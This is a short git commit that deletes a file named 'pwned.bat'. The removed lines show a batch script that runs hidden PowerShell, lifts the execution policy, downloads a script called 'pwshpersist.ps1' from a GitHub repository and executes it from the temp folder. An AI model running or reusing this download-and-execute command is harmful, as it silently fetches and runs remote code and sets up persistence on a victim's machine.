e73518cbf6758e02c7265ea3a02665fc44bb208a
Aristofer-Nemesis <73032092+Aristofer-Magnus@users.noreply.github.com>
2024-04-14 02:57:51 -0300

    Delete pwned.bat

--- pwned.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell -WindowStyle Hidden -command "Set-ExecutionPolicy Unrestricted; wget -Uri 'http://github.com/Aristofer-Magnus/pwned/raw/main/pwshpersist.ps1' -Outfile \"$env:temp\pwshpersist.ps1\"; & \"$env:temp\./pwshpersist.ps1\""
-pause
